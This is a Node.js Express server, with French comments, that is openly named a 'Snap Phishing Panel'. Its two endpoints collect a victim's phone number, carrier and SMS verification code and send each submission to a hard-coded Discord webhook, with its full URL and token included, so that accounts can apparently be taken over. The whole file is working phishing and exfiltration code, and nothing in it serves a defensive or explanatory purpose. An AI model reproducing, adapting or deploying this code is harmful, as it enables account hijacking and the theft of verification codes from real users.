const express = require('express');
const path = require('path');
const app = express();

// ✅ TON VRAI WEBHOOK DIRECT
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1523297468840935444/0Hq1u4X7B2UGZha98XM1f0WdBZEoJiA3uSQKPw2-YXGcPbMJ29IsYYkEDPybknuNJrjD';

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// 📱 Étape 1 : Numéro + opérateur
app.post('/api/submit', async (req, res) => {
    const { phone, operator } = req.body;
    
    if (!phone || !operator) {
        return res.status(400).json({ error: 'Champs manquants' });
    }

    console.log(`[+] Nouveau: ${phone} | ${operator}`);

    const ok = await sendToDiscord({
        embeds: [{
            color: 0xFFFC00,
            title: '📞 Étape 1 - Nouveau numéro',
            thumbnail: { url: 'https://assets.stickpng.com/images/580b57fcd9996e24bc43c536.png' },
            fields: [
                { name: '📱 Numéro', value: `**${phone}**`, inline: true },
                { name: '📡 Opérateur', value: `**${operator}**`, inline: true },
                { name: '🕐 Heure', value: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }), inline: false }
            ],
            footer: { text: 'Snap Phishing • Étape 1/2' },
            timestamp: new Date().toISOString()
        }]
    });

    if (!ok) console.log('⚠️ Discord non joignable mais on continue');
    res.json({ success: true });
});

// 🔑 Étape 2 : Code de vérification
app.post('/api/verify', async (req, res) => {
    const { phone, operator, code } = req.body;
    
    if (!phone || !code) {
        return res.status(400).json({ error: 'Champs manquants' });
    }

    console.log(`[+] Code: ${code} pour ${phone}`);

    const ok = await sendToDiscord({
        embeds: [{
            color: 0x00FF00,
            title: '🔓 Étape 2 - Code reçu !',
            thumbnail: { url: 'https://assets.stickpng.com/images/580b57fcd9996e24bc43c536.png' },
            fields: [
                { name: '📱 Numéro', value: `**${phone}**`, inline: true },
                { name: '📡 Opérateur', value: `**${operator || 'Non spécifié'}**`, inline: true },
                { name: '🔑 Code', value: `**\`${code}\`**`, inline: true },
                { name: '🕐 Heure', value: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }), inline: false }
            ],
            footer: { text: 'Snap Phishing • Étape 2/2 ✅' },
            timestamp: new Date().toISOString()
        }]
    });

    if (!ok) console.log('⚠️ Discord non joignable mais on continue');
    res.json({ success: true });
});

// 📤 Fonction d'envoi vers Discord
async function sendToDiscord(payload) {
    try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: '📸 Snap Phishing',
                avatar_url: 'https://assets.stickpng.com/images/580b57fcd9996e24bc43c536.png',
                ...payload
            })
        });

        if (!response.ok) {
            const text = await response.text();
            console.error('❌ Erreur Discord:', response.status, text);
            return false;
        }
        
        console.log('✅ Envoyé sur Discord !');
        return true;
    } catch (error) {
        console.error('❌ Erreur réseau Discord:', error.message);
        return false;
    }
}

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`
╔══════════════════════════════╗
║  📸 Snap Phishing Panel      ║
║  🚀 http://localhost:${PORT}  ║
╚══════════════════════════════╝
    `);
});
